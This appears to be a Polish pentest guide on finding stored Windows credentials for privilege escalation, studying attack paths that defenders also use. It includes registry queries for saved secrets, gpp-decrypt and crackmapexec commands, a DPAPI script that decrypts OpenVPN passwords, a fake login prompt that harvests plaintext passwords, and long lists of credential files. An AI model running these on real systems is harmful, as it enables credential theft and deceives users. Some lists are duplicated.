Niektóre starsze instalacje zdalnego wsparcia zachowują nazwy wartości związane z hasłami w stałych kluczach rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewer identyfikował skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w nazwie wartości to jedynie wskazówka do dalszej weryfikacji: przed oceną tych danych uwierzytelniających sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, ich format oraz bieżący sposób uwierzytelniania. Wykorzystanie hasła do zdalnego wsparcia w celu uzyskania dostępu do bardziej uprzywilejowanego konta Windows wymaga również faktycznego ponownego użycia hasła oraz uprawnień do tego konta. Nie umieszczaj zaszyfrowanych ani odzyskanych haseł w standardowym wyniku enumeracji.

### Udostępnione arkusze kalkulacyjne z chronionymi arkuszami

Jeśli podejrzewasz, że czytelny udostępniony skoroszyt zawiera dane kont, rozróżnij **szyfrowanie pliku** od ochrony arkusza lub ukrytych kolumn. [Microsoft informuje](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), że ochrona arkusza kontroluje edycję i nie jest funkcją bezpieczeństwa; sama w sobie nie potwierdza, że zawartość skoroszytu jest zaszyfrowana. Przeglądaj wyłącznie pliki, do których masz uprawniony dostęp i które są istotne, a podczas szerokiej enumeracji nie wyświetlaj potencjalnych sekretów. Sama ścieżka do czytelnego pliku `.xlsx`, chroniony arkusz ani ukryta kolumna nie dowodzą, że istnieją tam dane uwierzytelniające lub że którekolwiek konto ma wyższe uprawnienia; osobno zweryfikuj rzeczywiste dane oraz bieżące uprawnienia konta.

### Zachowane poprawki zmian na serwerze CI

Serwer CI może zachowywać przesłane zmiany kodu źródłowego w swoim katalogu danych, nawet po zakończeniu kompilacji. [TeamCity opisuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako miejsce przechowywania zmian zdalnych przebiegów; katalog danych można skonfigurować i nie musi on znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku z danymi uwierzytelniającymi, klucza szyfrowania albo skryptu korzystającego z obu tych elementów. Na przykład proces PowerShell wykorzystujący `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft opisuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest przekazywany osobno. Najpierw sprawdź wyłącznie nazwy dostępnych poprawek, a następnie — za odpowiednim upoważnieniem — przejrzyj istotną zawartość, nie wyświetlając sekretów w standardowym wyniku enumeracji. Sama ścieżka poprawki, zaszyfrowana wartość ani odwołanie do klucza nie dowodzą, że dane uwierzytelniające są prawidłowe lub zapewniają dostęp o wyższych uprawnieniach. Ogranicz uprawnienia ACL katalogu danych i nie umieszczaj sekretów w zmianach kodu kompilacji.

### Własna rotacja hasła lokalnego administratora

Własny mechanizm rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a dane uwierzytelniające do bazy danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Sprawdź łącznie zaplanowane zadanie aktualizatora, konto, uprawnienia ACL konfiguracji, listener oraz uprawnienia do bazy danych. Baza danych dostępna wyłącznie przez loopback jest nadal osiągalna dla użytkownika lokalnego, który ma prawidłowe dane uwierzytelniające, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza są dostępne obok szyfrogramu, przed zaufaniem szyfrowaniu sprawdź dokładny sposób wyprowadzania klucza. Schemat deterministycznie wyprowadzający klucz AES z ujawnionego ziarna przy użyciu Go [`math/rand`](https://pkg.go.dev/math/rand) nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest przeznaczony do losowości wrażliwej z punktu widzenia bezpieczeństwa. Zanim uznasz odzyskane hasło za możliwą ścieżkę eskalacji, potwierdź, że jest aktualne i należy do konta należącego do lokalnej grupy Administrators. Samo zaplanowane zadanie, ścieżka `.env` ani zaszyfrowany ciąg nie potwierdzają żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w standardowym wyniku enumeracji.

Do zarządzania hasłami lokalnego administratora używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Przechowywanie w katalogu lub Entra i związane z nim mechanizmy kontroli dostępu różnią się od własnej lokalnej bazy danych; podobnie to [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) określają, czy uwierzytelniony użytkownik bazy danych może odczytać konkretny indeks.

### Archiwa wtyczek serwera Java i ponowne użycie danych uwierzytelniających

Niektóre wtyczki serwera Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelna, niestandardowa wtyczka może zawierać konfigurację lub bytecode z osadzonymi danymi uwierzytelniającymi usługi. Przeglądaj archiwum wyłącznie za odpowiednim upoważnieniem i nie umieszczaj odzyskanych sekretów w standardowym wyniku enumeracji. Sama ścieżka wtyczki nie dowodzi, że istnieje w niej sekret, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla bardziej uprzywilejowanego konta. Sprawdź odpowiednie uprawnienia ACL plików i zastąp ponownie używane dane uwierzytelniające odrębnymi sekretami. Informacje o układzie katalogów znajdziesz w [przewodniku PaperMC dotyczącym instalacji wtyczek](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwów — w [dokumentacji JAR firmy Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Dane uwierzytelniające wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać plik `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, przejrzyj jednocześnie rekordy `OFUSER` i właściwość `passwordKey`. Zgodnie z [dokumentacją dostawcy dotyczącą dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html), Openfire może przechowywać hasła w postaci zwykłego tekstu lub szyfrować je przy użyciu klucza przechowywanego we wspomnianej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest prawidłowe dla bardziej uprzywilejowanej tożsamości; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia danych uwierzytelniających. Ścieżka jest wskazówką inwentaryzacyjną, więc nie umieszczaj zawartości bazy danych ani danych uwierzytelniających w standardowym wyniku enumeracji.

Oddzielny plik `Openfire\conf\openfire.xml` może ujawnić skonfigurowane porty i interfejs powiązania konsoli administracyjnej, nawet jeśli używana jest zewnętrzna baza danych. Openfire zwykle powiązuje konsolę administracyjną z loopback; lokalne konto nadal może uzyskać dostęp do tego adresu, jeśli listener działa. Sprawdź łącznie faktyczny listener, autoryzowaną rolę administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator mogący zainstalować wtyczkę może doprowadzić do uruchomienia jej kodu w kontekście usługi, który może mieć wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło do konta ani czytelna ścieżka konfiguracji same w sobie nie dowodzą dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera zarządzania kryminalistycznego

Konfiguracje serwera Velociraptor, zwykle o nazwie `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wygenerować certyfikat klienta API. To, czy prowadzi to do wyższych uprawnień, zależy od ról użytkowników na serwerze, dostępności API oraz tożsamości, w której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne materiały; znalezienie jej nie potwierdza dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, więc czytelna konfiguracja serwera może go nie zawierać.

Na serwerze Windows sprawdź uprawnienia ACL **konfiguracji serwera** w katalogu instalacyjnym oraz chronionych kopii zapasowych. Jedną z możliwych lokalizacji jest `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli ścieżka skonfigurowana dla usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że `CA.private_key` faktycznie się w nim znajduje. Nie wyświetlaj klucza prywatnego w logach ani wynikach enumeracji. Proces dostawcy `config api_client` używa klucza CA do wystawienia certyfikatu klienta, ale wymagane jest również odpowiednie uprawnienie po stronie serwera; jego utworzenie lub zmiana może wymagać dostępu do zapisu w bazie danych albo ponownego uruchomienia usługi. Istniejąca uprzywilejowana tożsamość serwera może zapewniać ścieżkę dostępu, nawet gdy zapis jest niemożliwy. Zapytania API z uprawnieniami do wykonywania poleceń działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe restrykcyjnymi uprawnieniami ACL, przechowuj klucz podpisywania CA offline, jeśli to możliwe, oraz ograniczaj role API i dostęp do listenera. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) i [wskazówki dotyczące konfiguracji bezpieczeństwa](https://docs.velociraptor.app/docs/deployment/security/).

### Dane uwierzytelniające PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to odrębny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik eksportu SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; na [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazano natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane dane uwierzytelniające są nadal ważne lub zapewniają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, dlatego sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz w tej ścieżce jakiś wpis, prawdopodobnie będzie to zapisany klucz SSH. Jest zaszyfrowany, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie systemu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika już nie działa. Próbowałem utworzyć klucze ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki instalacji nienadzorowanej

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe hive `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wyodrębnieniem czegokolwiek obejrzyj **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on hive, a standardowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często okazują się fałszywym tropem. Udział SMB to odrębna ścieżka dostępu i należy go sprawdzać tylko wtedy, gdy jest objęty zakresem. Zobacz wskazówki Microsoft dotyczące [obrazów systemu Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [pliki hive rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Dane uwierzytelniające do chmury

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Buforowane hasło GPP

Dostępna była wcześniej funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pośrednictwem Group Policy Preferences (GPP). Metoda ta miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty zasad grupy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych obiektach GPP, zaszyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ użytkownicy mogli w ten sposób uzyskać podwyższone uprawnienia.

Aby ograniczyć to ryzyko, opracowano funkcję wyszukującą lokalnie buforowane pliki GPP zawierające niepuste pole „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, ułatwiając identyfikację i usunięcie tej luki w zabezpieczeniach.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config zawierającego dane uwierzytelniające:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w webroot IIS

Stare archiwum ZIP umieszczone bezpośrednio w webroot udostępnianym przez serwer może ujawnić wcześniejsze pliki konfiguracyjne i możliwe do ponownego wykorzystania dane uwierzytelniające. Przed uznaniem tego za ekspozycję sprawdź skonfigurowaną ścieżkę fizyczną witryny i to, czy archiwum jest faktycznie dostępne przez HTTP. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie jego danych uwierzytelniających, a nawet danych innego użytkownika**, jeśli uważasz, że może je znać (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** zapisane **jawnym tekstem** lub w formacie **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Wariant listy nazw plików bez rozszerzenia Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 zwykle używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć przechowywanych w nim danych uwierzytelniających. Podczas sprawdzania, gdzie przechowywane są takie pliki, sprawdź dostępne profile użytkowników i skonfigurowane katalogi główne udziałów plików.

Czytelny plik KeePass `.kdbx` jest również jedynie wskazówką na obecność zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest prawidłowe hasło główne oraz każdy skonfigurowany plik klucza lub czynnik konta. Jeśli podczas autoryzowanego przeglądu znajdziesz w jednym z wpisów parę hashy LM:NT, sprawdź, czy wskazane konto istnieje oraz czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Sam wpis w sejfie nie przyznaje uprawnień Administrator ani SYSTEM; dostęp do zdalnej usługi, uprawnienia konta i ewentualny osobny etap uruchomienia usługi również muszą być spełnione. Inwentaryzacja powinna podawać ścieżkę do sejfu i informację o możliwości jego odczytu, a nie wyświetlać bazy danych ani przechowywanych w niej danych uwierzytelniających.

Przeszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Wariant polecenia wyszukiwania bez rozszerzenia Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Warto też sprawdzić Kosz w poszukiwaniu znajdujących się w nim danych uwierzytelniających.

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wyraźnie wskazują na dane uwierzytelniające. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. System Windows przechowuje oryginalną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako powiązany wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, identyfikatora SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie istnieje żadna możliwa do odzyskania kopia zapasowa. Traktuj nazwę archiwum jako wskazówkę do weryfikacji, a nie dowód, że zawiera ono prawidłowy sekret.

Dostępny, usunięty plik `.pfx` może również być tropem dotyczącym **code-signing**. Jeśli zawiera dostępny klucz prywatny, klucz ten może posłużyć do podpisania zmienionego skryptu PowerShell; [PowerShell wymaga certyfikatu code-signing z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker sprawdzają tożsamość osoby podpisującej i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, aby bieżąca tożsamość mogła zmodyfikować konkretny skrypt, aktywna reguła akceptowała uzyskany podpis dla tego skryptu i docelowego konta, a zaplanowane zadanie lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, temat certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia całego łańcucha. Przed otwarciem materiału zawierającego klucz prywatny lub uruchomieniem zadania sprawdź metadane, ACL, zasady i zaplanowane polecenie.

Sprawdź też dostępne bazy danych profili klientów komunikatorów, notatki i odebrane pliki w poszukiwaniu tropów dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w archiwum kopii zapasowej o określonej nazwie. Takie materiały mogą zapewnić dostęp do oddzielnego, zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz uprawnienia do dostępu. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie danych uwierzytelniających domeny w trybie offline wymaga również pasującego pliku gałęzi rejestru `SYSTEM`, zgodnie z opisem w [procedurze tworzenia kopii zapasowej i pracy z uprzywilejowanymi grupami](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików i zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania ani kopia zapasowa domeny.

Do **odzyskiwania haseł** zapisanych przez różne programy możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Sprawdź bazy danych, w których są przechowywane hasła z **Chrome lub Firefox**.\
Sprawdź bazy danych, w których są przechowywane hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione w przeglądarkach — być może są tam zapisane jakieś **hasła**.

